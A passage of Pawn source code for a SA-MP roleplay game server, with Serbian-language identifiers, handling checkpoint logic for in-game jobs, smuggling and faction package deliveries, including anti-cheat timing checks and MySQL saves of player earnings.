				        	DodajWarnRed("~r~(AC|CP): ~w~%s[/spec %d] je stigao na marker pre vremena(za %d od %d sekundi).", ImeIgraca( playerid ), playerid, (NovoVreme[ playerid ]-ostatak), NovoVreme[ playerid ]);
							return 1;
	   					}

						GameTextForPlayer( playerid, "~y~Putnik izlazi iz ubera...", 4500, 1);
					    SMG_TogglePlayerControllable( playerid, false );
					    SetPlayerTimerEx(playerid, "Istovar", 5000, false, "ii", playerid, 2);
		       			CheckpointStatus[ playerid ] = 0;
				        SMG_DisablePlayerCheckpoint( playerid );
					}
					else if(PosaoUberCP[playerid] == 3)
					{
					    new time = gettime( );
		       			new ostatak = ( NovoVreme[ playerid ] - ( time - StaroVreme[ playerid ] ) );
			        	if( ( time - StaroVreme[ playerid ] ) < NovoVreme[ playerid ] )
						{
						   	SendErrorMessage( playerid, "Dosli ste ranije na marker nego sto je predvidjeno. " );
						   	SendErrorMessage( playerid, "Sacekajte jos %d sekundi i udjite ponovo u marker.", ostatak );
				        	DodajWarnRed("~r~(AC|CP): ~w~%s[/spec %d] je stigao na marker pre vremena(za %d od %d sekundi).", ImeIgraca( playerid ), playerid, (NovoVreme[ playerid ]-ostatak), NovoVreme[ playerid ]);
							return 1;
	   					}

						CheckpointStatus[ playerid ] = 0;
			   			SMG_TogglePlayerControllable( playerid, false );
			      		SetPlayerTimerEx(playerid, "SlobodnoSada", 2000, false, "i", playerid);

						new bonus = random(100*jskInfo[playerid][skill_Uber]), zarada;
						if(ServerInfo[HappyJobs] == 0) zarada = jobsInfos[ (PlayerInfo[ playerid ][ xPosao ]-1) ][ jSalary ];
						else zarada = jobsInfos[ (PlayerInfo[ playerid ][ xPosao ]-1) ][ jSalary ]*ServerInfo[HappyJobs];

						if(jskInfo[playerid][skill_Uber] == 100) 
						{
							PlayerInfo[ playerid ][ xBRacun ] += (zarada+bonus);
							sql_user_update_integer( playerid, "xBRacun", PlayerInfo[ playerid ][ xBRacun ] );
						}
						else {
							PlayerInfo[ playerid ][ xBRacun ] += (zarada+bonus);
							sql_user_update_integer( playerid, "xBRacun", PlayerInfo[ playerid ][ xBRacun ] );

							jskInfo[playerid][skill_Uber]++;
							sql_updatejobskills(playerid);
						}
						UpdateBankTD( playerid );
						BussinesJobMoney( POSAO_UBERDRIVER, ((zarada+bonus)/10) );

						new string[200];
						format( string, sizeof( string ), "{36AB00}** Uspesno ste zavrsili sa voznjom.\n\n{FFFFFF}Plata: {36AB00}$%s\n{FFFFFF}Bonus: {36AB00}$%s\n{FFFFFF}Skill: {36AB00}%s\n\n{FFFFFF}Ukupna zarada: {36AB00}$%s",
							fNumber(zarada), fNumber(bonus), fNumber(jskInfo[playerid][skill_Uber]), fNumber(zarada+bonus));
						ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, string, "OK", "" );

						PosaoUberCP[ playerid ] = 0;
						DisablePlayerCheckpoint( playerid );

						if( PosaoVozilo[ playerid ] != -1 )
						{
							VehicleInfo[ PosaoVozilo[ playerid ] ][ Validv3DText ] = false;
					        DestroyDynamic3DTextLabel(VehicleInfo[ PosaoVozilo[ playerid ] ][ v3DText ]);
						    ResetVehicle( PosaoVozilo[ playerid ] );
							SMG_DestroyVehicle( PosaoVozilo[ playerid ] );
							PosaoVozilo[ playerid ] = -1;
						}
						if( PosaoTrailer[ playerid ] != -1 )
						{
							VehicleInfo[ PosaoTrailer[ playerid ] ][ Validv3DText ] = false;
					        DestroyDynamic3DTextLabel(VehicleInfo[ PosaoTrailer[ playerid ] ][ v3DText ]);
						    ResetVehicle( PosaoTrailer[ playerid ] );
							SMG_DestroyVehicle( PosaoTrailer[ playerid ] );
							PosaoTrailer[ playerid ] = -1;
						}
					}
			    }
			}
			case 5: 
			{
			    if(PosaoPNamjestajaCP[playerid] == 1) 
			    {
					GameTextForPlayer( playerid, "~y~Sacekajte malo...", 3000, 1);
				    SetPlayerTimerEx(playerid, "posaoProizdvodacNamjestaja", 3500, false, "ii", playerid, 1);
	       			CheckpointStatus[ playerid ] = 0;
			        SMG_DisablePlayerCheckpoint( playerid );

					RemovePlayerAttachedObject(playerid, OBJECT_SLOT_NONVEHICLE);
					SetPlayerSpecialAction(playerid, false);

		            NamjestajObject[playerid] = CreatePlayerObject(playerid, 2912, -2120.3877, 2745.9041, 13.2365, 0.0000, 0.0000, 0.0000);
	                MovePlayerObject(playerid, NamjestajObject[playerid], -2124.2227, 2745.9041, 13.2365, 1.0);
				}
				else if(PosaoPNamjestajaCP[playerid] == 2) 
				{
					EnableAntiCheatForPlayer(playerid, 49, false);
					posao_PNamjestajTDs(playerid, true);
			        SMG_DisablePlayerCheckpoint( playerid );
				}
				else if(PosaoPNamjestajaCP[playerid] == 3) 
				{
					posao_PNamjestajColorTDs(playerid, true);
					SMG_DisablePlayerCheckpoint(playerid);
				}
				else if(PosaoPNamjestajaCP[playerid] == 4) 
				{
					SMG_SetPlayerCheckpoint( playerid, -2155.0488, 2752.2173, 12.3069, 2.0);
					CheckpointStatus[playerid] = 5;
					PosaoPNamjestajaCP[playerid] = 5;

			    	DestroyPlayerObject(playerid, NamjestajObject[playerid]);
			    	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_CARRY);
			    	SetPlayerAttachedObject(playerid, OBJECT_SLOT_NONVEHICLE, 2912, 1, 0.15, 0.4, 0.0, 0.0, 90.0, 0.0, 1.0, 1.0, 1.0);
				}
				else if(PosaoPNamjestajaCP[playerid] == 5) 
				{
					CheckpointStatus[ playerid ] = 0;
		   			SMG_TogglePlayerControllable( playerid, false );
		      		SetPlayerTimerEx(playerid, "SlobodnoSada", 2000, false, "i", playerid);

					new bonus = random(100*jskInfo[playerid][skill_PNamjestaja]), zarada;
					if(ServerInfo[HappyJobs] == 0) zarada = jobsInfos[ (PlayerInfo[ playerid ][ xPosao ]-1) ][ jSalary ];
					else zarada = jobsInfos[ (PlayerInfo[ playerid ][ xPosao ]-1) ][ jSalary ]*ServerInfo[HappyJobs];

					if(jskInfo[playerid][skill_PNamjestaja] == 100) 
					{
						PlayerInfo[ playerid ][ xBRacun ] += (zarada+bonus);
						sql_user_update_integer( playerid, "xBRacun", PlayerInfo[ playerid ][ xBRacun ] );
					}
					else {
						PlayerInfo[ playerid ][ xBRacun ] += (zarada+bonus);
						sql_user_update_integer( playerid, "xBRacun", PlayerInfo[ playerid ][ xBRacun ] );

						jskInfo[playerid][skill_PNamjestaja]++;
						sql_updatejobskills(playerid);
					}
					UpdateBankTD( playerid );
					BussinesJobMoney( POSAO_PNAMJESTAJA, ((zarada+bonus)/10) );

					new string[200];
					format( string, sizeof( string ), "{36AB00}** Uspesno ste zavrsili proizvodnju namjestaja.\n\n{FFFFFF}Plata: {36AB00}$%s\n{FFFFFF}Bonus: {36AB00}$%s\n{FFFFFF}Skill: {36AB00}%s\n\n{FFFFFF}Ukupna zarada: {36AB00}$%s",
						fNumber(zarada), fNumber(bonus), fNumber(jskInfo[playerid][skill_PNamjestaja]), fNumber(zarada+bonus));
					ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, string, "OK", "" );

					PosaoPNamjestajaCP[ playerid ] = 0;
					DisablePlayerCheckpoint( playerid );
					RemovePlayerAttachedObject(playerid, OBJECT_SLOT_NONVEHICLE);
					SetPlayerSpecialAction(playerid, false);
					DestroyPlayerObject(playerid, NamjestajObject[playerid]);
					EnableAntiCheatForPlayer(playerid, 49, true);
				}
			}
			case 6:
			{
			    if(OkacioTrailer[playerid] && GetPlayerState( playerid ) == PLAYER_STATE_DRIVER && 
			    	PlayerInfo[ playerid ][ xPosao ] == POSAO_MEHANICAR && GetPlayerVehicleID( playerid ) == PosaoVozilo[playerid] )
			    {
				    new time = gettime(),
	    				ostatak = ( NovoVreme[ playerid ] - ( time - StaroVreme[ playerid ] ) );

					if( ( time - StaroVreme[ playerid ] ) < NovoVreme[ playerid ] )
					{
					   	SendErrorMessage( playerid, "Dosli ste ranije na marker nego sto je predvidjeno. " );
					   	SendErrorMessage( playerid, "Sacekajte jos %d sekundi i udjite ponovo u marker.", ostatak );
			        	DodajWarnRed( "~r~(AC|CP): ~w~%s[/spec %d] je stigao na marker pre vremena(za %d od %d sekundi).", ImeIgraca( playerid ), playerid, (NovoVreme[ playerid ]-ostatak), NovoVreme[ playerid ] );
						return 1;
		   			}
					GameTextForPlayer( playerid, "~y~Otkacanje vozila...", 6000, 1);
				    SMG_TogglePlayerControllable( playerid, false );
				    SetPlayerTimerEx(playerid, "Istovar", 5000, false, "ii", playerid, 3);
		  			CheckpointStatus[ playerid ] = 0;
			        SMG_DisablePlayerCheckpoint( playerid );
				}
				else
				{
				    SendJobMessage(playerid, "Kucajte {FFFFFF}[ /zakaci ] {36AB00}da pokupite vozilo.");
				}
			}
			case 7:
			{
				if( IgracNosiPaket[ playerid ] && ( GetFactionType( playerid ) == ORG_TIP_MAFIJA || GetFactionType( playerid ) == ORG_TIP_BANDA ) )
				{
				    new OrgID = PlayerInfo[ playerid ][ xClan ];

				    SMG_DisablePlayerCheckpoint( playerid );
		            CheckpointStatus[ playerid ] = 0;

		            RemovePlayerAttachedObject( playerid, OBJECT_SLOT_MAIN );

				    IgracNosiPaket[ playerid ] = false;

				    foreach( new i : Player)
					{
        				if( GetFactionType( i ) == ORG_TIP_MAFIJA || GetFactionType( i ) == ORG_TIP_BANDA || PlayerInfo[ i ][ xAdmin ] > 0 || PlayerInfo[ i ][ xSpecAdmin ] > 0 )
						{ 
							SCMF( i, ZUTA, "(PAKET): Igrac {CCCCCC}%s(%s) {FFFF00}je dostavio paket u HQ svoje organizacije.", ImeIgraca( playerid ), org_info[ OrgID ][ oPreFix ] );
						}
					} 
					OrgPoruka( OrgID, ZUTA, "(PAKET): Vasa organizacija je dobila {FFFFFF}(%d) {FFFF00}materijala i {FFFFFF}(%dg) {FFFF00}droge.", ServerInfo[ PaketStvari ][ 0 ], ServerInfo[ PaketStvari ][ 1 ] );

					org_info[ OrgID ][ oSafeMats ] += ServerInfo[ PaketStvari ][ 0 ];
					org_info[ OrgID ][ oSafeDrugAmmount ] += ServerInfo[ PaketStvari ][ 1 ];

                    ServerInfo[ PaketPoceo ] = false;
                    ServerInfo[ PaketID ] = -1;
                    ServerInfo[ PaketNijeNaSvomMestu ] = false;
					KillTimer(ServerInfo[ PaketTimer ]);

					new q[ 130 ];
					mysql_format( mSQL, q, sizeof(q), "UPDATE `organizations` SET `safe_drug_amount` = '%d', `safe_mats` = '%d' WHERE `org_id` = '%d'",
														org_info[ OrgID ][ oSafeDrugAmmount ],
														org_info[ OrgID ][ oSafeMats ],
														org_info[ OrgID ][ oID ] );
				    mysql_tquery( mSQL, q );

				    ServerInfo[ PaketStvari ][ 0 ] = 0;
            		ServerInfo[ PaketStvari ][ 1 ] = 0;
            		PaketNewPos[0] = 0.0;
					PaketNewPos[1] = 0.0;
					PaketNewPos[2] = -10000.0;
				}
			}
			case 8:
			{
				//prazno
			}
			case 9:
			{
				//prazno
			}
			case 10:
			{
				switch(PosaoPMunicijeCP[playerid])
				{
					case 1:
				    {
				    	SetPlayerPos(playerid, RandomAmmoPos[PosaoPMunicijeTable[playerid]][0], RandomAmmoPos[PosaoPMunicijeTable[playerid]][1], RandomAmmoPos[PosaoPMunicijeTable[playerid]][2]);
				    	SetPlayerFacingAngle(playerid, RandomAmmoPos[PosaoPMunicijeTable[playerid]][3]);

						GameTextForPlayer( playerid, "~y~Sacekajte malo...", 3000, 1);
					    SetPlayerTimerEx(playerid, "posaoProizvodjacMunicije", 10000, false, "i", playerid);
		       			CheckpointStatus[ playerid ] = 0;
				        SMG_DisablePlayerCheckpoint( playerid );
						SetPlayerSpecialAction(playerid, false);

			            MunicijaObject[playerid] = CreatePlayerObject(playerid, 2359, AmmoBoxPos[PosaoPMunicijeTable[playerid]][0], AmmoBoxPos[PosaoPMunicijeTable[playerid]][1], AmmoBoxPos[PosaoPMunicijeTable[playerid]][2], AmmoBoxPos[PosaoPMunicijeTable[playerid]][3], AmmoBoxPos[PosaoPMunicijeTable[playerid]][4], AmmoBoxPos[PosaoPMunicijeTable[playerid]][5]);
					
			            ApplyAnimation(playerid, "CAR_CHAT", "CAR_Sc4_BL", 4.0, 1, 1, 1, 1, 10000, 0);
			            SetPlayerAttachedObject(playerid, OBJECT_SLOT_NONVEHICLE, 18644, 5, 0.078999, 0.042999, -0.012999, -3.299995, 0.000000, 0.000000);
						SetPlayerAttachedObject(playerid, OBJECT_SLOT_MAIN, 18635, 6);
					}
					case 2:
					{
						CheckpointStatus[ playerid ] = 0;
			   			SMG_TogglePlayerControllable( playerid, false );
			      		SetPlayerTimerEx(playerid, "SlobodnoSada", 2000, false, "i", playerid);

						new bonus = random(100 * jskInfo[playerid][skill_PMunicije]), zarada;
						if(bonus > 10000) bonus = 0;
						if(ServerInfo[HappyJobs] == 0) zarada = jobsInfos[ (PlayerInfo[ playerid ][ xPosao ]-1) ][ jSalary ];
						else zarada = jobsInfos[ (PlayerInfo[ playerid ][ xPosao ]-1) ][ jSalary ] * ServerInfo[HappyJobs];

						if(jskInfo[playerid][skill_PMunicije] == 100)
						{
							PlayerInfo[ playerid ][ xBRacun ] += (zarada+bonus);
							sql_user_update_integer( playerid, "xBRacun", PlayerInfo[ playerid ][ xBRacun ] );
						}
						else 
						{
							PlayerInfo[ playerid ][ xBRacun ] += (zarada+bonus);
							sql_user_update_integer( playerid, "xBRacun", PlayerInfo[ playerid ][ xBRacun ] );

							jskInfo[playerid][skill_PMunicije]++;
							sql_updatejobskills(playerid);
						}
						UpdateBankTD(playerid);
						BussinesJobMoney(POSAO_PMUNICIJE, ((zarada+bonus)/10));

						new string[200];
						format( string, sizeof( string ), "{36AB00}** Uspesno ste zavrsili proizvodnju municije.\n\n{FFFFFF}Plata: {36AB00}$%s\n{FFFFFF}Bonus: {36AB00}$%s\n{FFFFFF}Skill: {36AB00}%s\n\n{FFFFFF}Ukupna zarada: {36AB00}$%s",
							fNumber(zarada), fNumber(bonus), fNumber(jskInfo[playerid][skill_PMunicije]), fNumber(zarada+bonus));
						ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, string, "OK", "" );

						PosaoPMunicijeCP[ playerid ] = 0;
						PosaoPMunicijeTable[ playerid ] = 0;
						DisablePlayerCheckpoint( playerid );
						RemovePlayerAttachedObject(playerid, OBJECT_SLOT_NONVEHICLE);
						SetPlayerSpecialAction(playerid, false);
						DestroyPlayerObject(playerid, MunicijaObject[playerid]);
						ApplyAnimation(playerid, "CARRY", "putdwn", 4.0, 0, 1, 1, 0, 0, 1);
					}
				}
			}
			case 11..14:
			{
			}
			case 15:
			{
			    SMG_DisablePlayerCheckpoint( playerid );
				SendClientMessage( playerid, ZUTA, "(GPS): Stigli ste na zeljenu lokaciju.");
				CheckpointStatus[ playerid ] = 0;
			}
			case 16..19:
			{
			}
			case 20:
			{
			    if( PlayerInfo[ playerid ][ xPosao ] == POSAO_PILOT && GetPlayerVehicleID( playerid ) == PosaoVozilo[playerid])
				{
				    if( LetZG[ playerid ] == 1 && GetPlayerState( playerid ) == PLAYER_STATE_DRIVER )
					{
						if( IsPlayerInRangeOfPoint( playerid, 5.0, 1847.4221, -2414.0798, 13.5547 ) )
						{
							SMG_TogglePlayerControllable( playerid, false );
							GameTextForPlayer( playerid, "~w~sacekajte, putnici se ukrcavaju...", 5000, 5);
							PilotTimer[ playerid ] = SetPlayerTimerEx(playerid, "PilotUtovar", 5000, false, "i", playerid);
							SMG_SetPlayerCheckpoint( playerid, -1506.8629, -14.1312, 14.1409, 5.0 );
							LetZG[ playerid ] = 2;
							StaroVreme[ playerid ] = gettime();
    						NovoVreme[ playerid ] = 80;
						}
					}
					else if( LetZG[ playerid ] == 2 && GetPlayerState( playerid ) == PLAYER_STATE_DRIVER )
					{
						if( IsPlayerInRangeOfPoint( playerid, 5.0, -1506.8629, -14.1312, 14.1409 ) )
						{
						    new time = gettime( );
						    new ostatak = ( NovoVreme[ playerid ] - ( time - StaroVreme[ playerid ] ) );
						    if( ( time - StaroVreme[ playerid ] ) < NovoVreme[ playerid ] )
							{
							   	SendErrorMessage( playerid, "Dosli ste ranije na marker nego sto je predvidjeno. " );
							   	SendErrorMessage( playerid, "Sacekajte jos %d sekundi i udjite ponovo u marker.", ostatak );
					        	DodajWarnRed("~r~(AC|CP): ~w~%s[/spec %d] je stigao na marker pre vremena(za %d od %d sekundi).", ImeIgraca( playerid ), playerid, (NovoVreme[ playerid ]-ostatak), NovoVreme[ playerid ]);
								return 1;
						    }

							SMG_TogglePlayerControllable( playerid, false );
							GameTextForPlayer( playerid, "~w~sacekajte, putnici se iskrcavaju...", 5000, 5);
							PilotTimer[ playerid ] = SetPlayerTimerEx(playerid, "PilotUtovar", 5000, false, "i", playerid);
							SMG_SetPlayerCheckpoint( playerid, 1879.6438, -2493.6636, 13.5547, 5.0 );
							LetZG[ playerid ] = 3;
							StaroVreme[ playerid ] = gettime();
    						NovoVreme[ playerid ] = 75;
						}
					}
					else if( LetZG[ playerid ] == 3 && GetPlayerState( playerid ) == PLAYER_STATE_DRIVER )
					{
						if( IsPlayerInRangeOfPoint( playerid, 5.0, 1879.6438, -2493.6636, 13.5547 ) )
						{
						    new time = gettime( );
						    new ostatak = ( NovoVreme[ playerid ] - ( time - StaroVreme[ playerid ] ) );
						    if( ( time - StaroVreme[ playerid ] ) < NovoVreme[ playerid ] )
							{
							   	SendErrorMessage( playerid, "Dosli ste ranije na marker nego sto je predvidjeno. " );
							   	SendErrorMessage( playerid, "Sacekajte jos %d sekundi i udjite ponovo u marker.", ostatak );
					        	DodajWarnRed("~r~(AC|CP): ~w~%s[/spec %d] je stigao na marker pre vremena(za %d od %d sekundi).", ImeIgraca( playerid ), playerid, (NovoVreme[ playerid ]-ostatak), NovoVreme[ playerid ]);
								return 1;
						    }

						    CheckpointStatus[ playerid ] = 0;
                            SMG_TogglePlayerControllable( playerid, false );
                            SetPlayerTimerEx(playerid, "SlobodnoSada", 2000, false, "i", playerid);

							new bonus = random(100*jskInfo[playerid][skill_Pilot]), zarada;
							if(ServerInfo[HappyJobs] == 0) zarada = jobsInfos[ (PlayerInfo[ playerid ][ xPosao ]-1) ][ jSalary ];
							else zarada = jobsInfos[ (PlayerInfo[ playerid ][ xPosao ]-1) ][ jSalary ]*ServerInfo[HappyJobs];

							if(jskInfo[playerid][skill_Pilot] == 100) 
							{
								PlayerInfo[ playerid ][ xBRacun ] += zarada;
								sql_user_update_integer( playerid, "xBRacun", PlayerInfo[ playerid ][ xBRacun ] );
							}
							else {
								PlayerInfo[ playerid ][ xBRacun ] += zarada;
								sql_user_update_integer( playerid, "xBRacun", PlayerInfo[ playerid ][ xBRacun ] );

								jskInfo[playerid][skill_Pilot]++;
								sql_updatejobskills(playerid);
							}
							UpdateBankTD( playerid );
							BussinesJobMoney( POSAO_PILOT, ((zarada+bonus)/10) );

							new string[200];
							format( string, sizeof(string), "{36AB00}Uspesno ste zavrsili prevoz putnika.\n\n{FFFFFF}Plata: {36AB00}$%s\n{FFFFFF}Bonus: {36AB00}$%s\n{FFFFFF}Skill: {36AB00}%s\n\n{FFFFFF}Ukupna zarada: {36AB00}$%s",
								fNumber(zarada), fNumber(bonus), fNumber(jskInfo[playerid][skill_Pilot]), fNumber(zarada+bonus));
							ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, string, "OK", "" );

							LetZG[ playerid ] = 0;
							DisablePlayerCheckpoint( playerid );

							if( PosaoVozilo[ playerid ] != -1 )
							{
							    VehicleInfo[ PosaoVozilo[ playerid ] ][ Validv3DText ] = false;
						        DestroyDynamic3DTextLabel(VehicleInfo[ PosaoVozilo[ playerid ] ][ v3DText ]);
							    ResetVehicle( PosaoVozilo[ playerid ] );
								SMG_DestroyVehicle( PosaoVozilo[ playerid ] );
								PosaoVozilo[ playerid ] = -1;
							}
							if( PosaoTrailer[ playerid ] != -1 )
							{
							    VehicleInfo[ PosaoTrailer[ playerid ] ][ Validv3DText ] = false;
						        DestroyDynamic3DTextLabel(VehicleInfo[ PosaoTrailer[ playerid ] ][ v3DText ]);
							    ResetVehicle( PosaoTrailer[ playerid ] );
								SMG_DestroyVehicle( PosaoTrailer[ playerid ] );
								PosaoTrailer[ playerid ] = -1;
							}
						}
					}
				}
			}
			case 21:
			{
			    if( PlayerInfo[ playerid ][ xPosao ] == POSAO_PILOT && GetPlayerVehicleID( playerid ) == PosaoVozilo[playerid] )
				{
				    if( LetSA[ playerid ] == 1 && GetPlayerState( playerid ) == PLAYER_STATE_DRIVER )
					{
						if( IsPlayerInRangeOfPoint( playerid, 5.0, 1847.4221, -2414.0798, 13.5547 ) )
						{
							SMG_TogglePlayerControllable( playerid, false );
							GameTextForPlayer( playerid, "~w~sacekajte, putnici se ukrcavaju...", 5000, 5);
							PilotTimer[ playerid ] = SetPlayerTimerEx(playerid, "PilotUtovar", 5000, false, "i", playerid);
							SMG_SetPlayerCheckpoint( playerid, 1477.5233, 1395.1841, 10.8203, 5.0 );
							LetSA[ playerid ] = 2;
							StaroVreme[ playerid ] = gettime();
    						NovoVreme[ playerid ] = 80;
						}
					}
					else if( LetSA[ playerid ] == 2 && GetPlayerState( playerid ) == PLAYER_STATE_DRIVER )
					{
						if( IsPlayerInRangeOfPoint( playerid, 5.0, 1477.5233, 1395.1841, 10.8203 ) )
						{
						    new time = gettime( );
						    new ostatak = ( NovoVreme[ playerid ] - ( time - StaroVreme[ playerid ] ) );
						    if( ( time - StaroVreme[ playerid ] ) < NovoVreme[ playerid ] )
							{
							   	SendErrorMessage( playerid, "Dosli ste ranije na marker nego sto je predvidjeno. " );
							   	SendErrorMessage( playerid, "Sacekajte jos %d sekundi i udjite ponovo u marker.", ostatak );
					        	DodajWarnRed("~r~(AC|CP): ~w~%s[/spec %d] je stigao na marker pre vremena(za %d od %d sekundi).", ImeIgraca( playerid ), playerid, (NovoVreme[ playerid ]-ostatak), NovoVreme[ playerid ]);
								return 1;
						    }

							SMG_TogglePlayerControllable( playerid, false );
							GameTextForPlayer( playerid, "~w~sacekajte, putnici se iskrcavaju...", 5000, 5);
							PilotTimer[ playerid ] = SetPlayerTimerEx(playerid, "PilotUtovar", 5000, false, "i", playerid);
							SMG_SetPlayerCheckpoint( playerid, 1879.6438, -2493.6636, 13.5547, 5.0 );
							LetSA[ playerid ] = 3;
							StaroVreme[ playerid ] = gettime();
    						NovoVreme[ playerid ] = 75;
						}
					}
					else if( LetSA[ playerid ] == 3 && GetPlayerState( playerid ) == PLAYER_STATE_DRIVER )
					{
						if( IsPlayerInRangeOfPoint( playerid, 5.0, 1879.6438, -2493.6636, 13.5547 ) )
						{
						    new time = gettime( );
						    new ostatak = ( NovoVreme[ playerid ] - ( time - StaroVreme[ playerid ] ) );
						    if( ( time - StaroVreme[ playerid ] ) < NovoVreme[ playerid ] )
							{
							   	SendErrorMessage( playerid, "Dosli ste ranije na marker nego sto je predvidjeno. " );
							   	SendErrorMessage( playerid, "Sacekajte jos %d sekundi i udjite ponovo u marker.", ostatak );
					        	DodajWarnRed("~r~(AC|CP): ~w~%s[/spec %d] je stigao na marker pre vremena(za %d od %d sekundi).", ImeIgraca( playerid ), playerid, (NovoVreme[ playerid ]-ostatak), NovoVreme[ playerid ]);
								return 1;
						    }

						    CheckpointStatus[ playerid ] = 0;
						    SMG_TogglePlayerControllable( playerid, false );
                            SetPlayerTimerEx(playerid, "SlobodnoSada", 2000, false, "i", playerid);

							new bonus = random(100*jskInfo[playerid][skill_Pilot]), zarada;
							if(ServerInfo[HappyJobs] == 0) zarada = jobsInfos[ (PlayerInfo[ playerid ][ xPosao ]-1) ][ jSalary ];
							else zarada = jobsInfos[ (PlayerInfo[ playerid ][ xPosao ]-1) ][ jSalary ]*ServerInfo[HappyJobs];

							if(jskInfo[playerid][skill_Pilot] == 100) 
							{
								PlayerInfo[ playerid ][ xBRacun ] += zarada;
								sql_user_update_integer( playerid, "xBRacun", PlayerInfo[ playerid ][ xBRacun ] );
							}
							else {
								PlayerInfo[ playerid ][ xBRacun ] += zarada;
								sql_user_update_integer( playerid, "xBRacun", PlayerInfo[ playerid ][ xBRacun ] );

								jskInfo[playerid][skill_Pilot]++;
								sql_updatejobskills(playerid);
							}
							PlayerInfo[ playerid ][ xBRacun ] += zarada;
							sql_user_update_integer( playerid, "xBRacun", PlayerInfo[ playerid ][ xBRacun ] );
							UpdateBankTD( playerid );

							BussinesJobMoney( POSAO_PILOT, ((zarada+bonus)/10) );

							new string[200];
							format( string, sizeof(string), "{36AB00}Uspesno ste zavrsili prevoz putnika.\n\n{FFFFFF}Plata: {36AB00}$%s\n{FFFFFF}Bonus: {36AB00}$%s\n{FFFFFF}Skill: {36AB00}%s\n\n{FFFFFF}Ukupna zarada: {36AB00}$%s",
								fNumber(zarada), fNumber(bonus), fNumber(jskInfo[playerid][skill_Pilot]), fNumber(zarada+bonus));
							ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, string, "OK", "" );

							LetSA[ playerid ] = 0;
							DisablePlayerCheckpoint( playerid );

							if( PosaoVozilo[ playerid ] != -1 )
							{
							    VehicleInfo[ PosaoVozilo[ playerid ] ][ Validv3DText ] = false;
						        DestroyDynamic3DTextLabel(VehicleInfo[ PosaoVozilo[ playerid ] ][ v3DText ]);
							    ResetVehicle( PosaoVozilo[ playerid ] );
								SMG_DestroyVehicle( PosaoVozilo[ playerid ] );
								PosaoVozilo[ playerid ] = -1;
							}
							if( PosaoTrailer[ playerid ] != -1 )
							{
							    VehicleInfo[ PosaoTrailer[ playerid ] ][ Validv3DText ] = false;
						        DestroyDynamic3DTextLabel(VehicleInfo[ PosaoTrailer[ playerid ] ][ v3DText ]);
							    ResetVehicle( PosaoTrailer[ playerid ] );
								SMG_DestroyVehicle( PosaoTrailer[ playerid ] );
								PosaoTrailer[ playerid ] = -1;
							}
						}
					}
				}
			}
			case 22:
			{
			    SMG_DisablePlayerCheckpoint( playerid );
			    SendJobMessage( playerid, "Stanite do kontejnera i uzmite smece {FFFFFF}'LEVIM KLIKOM MISA'." );
				CheckpointStatus[ playerid ] = 0;
			}
			case 23..31:
			{
			}
			case 32:
			{
			    if( GetPlayerState( playerid ) == PLAYER_STATE_ONFOOT && PlayerInfo[ playerid ][ xPosao ] == POSAO_RUDAR && PosaoRudar[ playerid ] != 0 && UzeoOpremu[ playerid ])
				{
                    SMG_DisablePlayerCheckpoint( playerid );
                    SMG_TogglePlayerControllable( playerid, false );
					PlayerPlaySound( playerid, 1056, 0.0, 0.0, 0.0 );
					ApplyAnimation( playerid, "CHAINSAW", "CSAW_1", 4.1, 1, 1, 1, 0, 0 );
					GameTextForPlayer( playerid, "~w~Kopate~n~sacekajte par sekundi", 12000, 4 );
					rudarPosao[ playerid ][ rudarTimer ] = SetPlayerTimerEx(playerid, "Iskopavanje", 10000, false, "i", playerid);

					SendJobMessage( playerid, "Poceli ste sa kopanjem sacekajte {FFFFFF}(10) {36AB00}sekundi.");
				}
			}
			case 33..38:
			{
			}
			case 39:
			{
			    if( ProcesSvercanja[ playerid ] == 1 )
				{
			        SMG_DisablePlayerCheckpoint( playerid );

  				 	if( GetFactionType( playerid ) == ORG_TIP_MAFIJA ) SMG_SetPlayerCheckpoint( playerid, -736.9412,-131.9153,59.8809, 2.0 );
  				 	else if( GetFactionType( playerid ) == ORG_TIP_BANDA ) SMG_SetPlayerCheckpoint( playerid, 211.5761,24.4846,2.5708, 2.0 );
	    			CheckpointStatus[ playerid ] = 39;
	    			ProcesSvercanja[ playerid ] = 2;

			    	SendClientMessage( playerid, 0x95B4A2FF, "(SVERC): Odite desno do magacina i uzmite vasu kutiju." );
	            }
	            else if( ProcesSvercanja[ playerid ] == 2 )
				{
			        SMG_DisablePlayerCheckpoint( playerid );

	                ProcesSvercanja[ playerid ] = 3;
	                CheckpointStatus[ playerid ] = 0;

	                SetPlayerAttachedObject( playerid, OBJECT_SLOT_NONVEHICLE, 3052, 1, 0.15, 0.4, 0.0, 0.0, 90.0, 0.0, 1.0, 1.0, 1.0 );

					if( GetFactionType( playerid ) == ORG_TIP_MAFIJA ) SendClientMessage( playerid, 0x95B4A2FF, "(SVERC): Uzeli ste kutiju sa materijalima, kucajte {FFFFFF}[ /ubaciukombi ].");
					else if( GetFactionType( playerid ) == ORG_TIP_BANDA ) SendClientMessage( playerid, 0x95B4A2FF, "(SVERC): Uzeli ste kutiju sa drogom, kucajte {FFFFFF}[ /ubaciukombi ].");

					ApplyAnimation( playerid, "CARRY", "crry_prtial", 4.1, 0, 1, 1, 1, 1, 1 );
	            }
	            else if( ProcesSvercanja[ playerid ] == 5 )
				{
	                if( !IsPlayerAttachedObjectSlotUsed( playerid, OBJECT_SLOT_NONVEHICLE ) ) return SendErrorMessage( playerid, "Nemate kutiju u rukama!");

			        SMG_DisablePlayerCheckpoint( playerid );
					RemovePlayerAttachedObject( playerid, OBJECT_SLOT_NONVEHICLE );

			        ProcesSvercanja[ playerid ] = 0;
					CheckpointStatus[ playerid ] = 0;
                    PlayerInfo[ playerid ][ xSvercer ] = 5;

					if( GetFactionType( playerid ) == ORG_TIP_MAFIJA )
					{
					    new mats = random(50)+980;
						SCMF( playerid, 0x95B4A2FF, "(SVERC): Otvorili ste kutiju i dobili {FFFFFF}(%d) {95B4A2}materijala.", mats );

						PlayerInfo[ playerid ][ xMaterijali ] += mats;

						new q[ 128 ];
						mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `mats_smugl` = '%d', `materials` = '%d' WHERE `user_id` = '%d'", PlayerInfo[ playerid ][ xSvercer ], PlayerInfo[ playerid ][ xMaterijali ], PlayerInfo[ playerid ][ xID ] );
